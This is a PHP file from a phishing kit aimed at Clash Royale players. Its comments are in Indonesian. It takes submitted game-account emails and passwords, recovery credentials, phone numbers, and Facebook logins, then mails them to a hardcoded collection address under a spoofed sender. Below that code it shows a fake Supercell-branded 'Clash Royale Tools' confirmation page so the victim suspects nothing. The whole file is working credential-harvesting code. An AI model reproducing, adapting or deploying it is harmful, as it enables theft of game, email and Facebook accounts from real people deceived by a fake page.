<?php

$email = $_POST['Email'];
$password = $_POST['Pass'];

$emailkamu = 
"rsltphising@gmail.com"; //GANTI EMAILMU DIMARI GAN
$tomail = $emailkamu; 
$email    = $_POST['email'];
$password = $_POST['password'];
$teha = $_POST['teha'];
$xp = $_POST['xp'];
$henpon = $_POST['hendpon'];
$recover = $_POST['recover'];
$pw = $_POST['pw'];
$gh = $_POST['gh'];
$fb = $_POST['fb'];
$passfb = $_POST['passfb'];
$ct = $_POST['ct'];
$ng = $_POST['ng'];
$ng1 = $_POST['ng1'];
$ng2 = $_POST['ng2'];
$pc = $_POST['pc'];

$subject = "[+] SETOR CR [+]";
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:black;color:white;text-align:center;"><font size=5><b>[+] Account CR Info [+]</b><br><font size="2">Setor CR Punya si : '.$email.'</font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:white;color:black;text-align:left;">
<hr style="color:red">
<font size="2">
Email              : <b>".$email."</b><br>
Password           : <b>".$password."</b><br>
Email Pemulihan    : <b>".$recover."</b><br>
Password Pemulihan : <b>".$pw."</b><br>
Nope Korban        : <b>".$hendpon."</b><br>
Nope Email         : <b>".$pc."</b><br>
Exp                : <b>".$xp."</b><br></font>

<hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> [+] DATA GAMENYA [+] </b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:white;color:black;text-align:left;">
<hr style="color:red">
<font size="2">
Nama Klan : <b>".$nickname."</b><br>
Negara    : <b>".$ng."</b><br>
Arena     : <b>".$teha."</b><br></font>

<hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> [+] DATA FACEBOOK NYA [+] </b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:white;color:black;text-align:left;">
<hr style="color:red">
<font size="2">
Email Facebook : <b>".$fb."</b><br>
Password       : <b>".$passfb."</b><br>
Kota           : <b>".$ct."</b><br>
Negara         : <b>".$ng1."</b><br>
Nomer Hp       : <b>".$ng2."</b><br>
Email          : <b>".$email."</b><br>
Phone          : <b>".$hendpon."</b><br>
Password       : <b>".$password."</b><br></font>
<hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> [+] USER PC INFO [+] </b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:white;color:black;text-align:left;">
<hr style="color:red">
<font size="2">

<hr style="color:red">
</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> [+] TQ SUDAH ORDER [+] </b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:white;color:black;text-align:left;">
<hr style="color:red">
<font size="2">
IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: GUA LEMPAR FB NEH <hasilibadah@lucknut.com>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sending Calsh Royale Tools</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="js/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>

<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="GG.png"/>
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-facebook"></i> Supercell©</b></div>
</div>
<center style="background:white;"><br>
<div class="col-md-12">
<h2><img src="ng.png"></h2>
<h3>
  Get Clash Royale Tools
</h3>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<h4 >
  Thank You For Using This Tools.</p>
  You Tools has ben send! Please wait 24 hours.
  </h4><br/>
  <div style="width:100%" class="form-group">
  <a  href="logout.php" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> Logout </a>
</div>

</div><br><br>
</div>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>Clash Royale Tools </p></center>
<p>Copyright &copy; 2017 Supercell©.</p>

</div>
</div>

</div>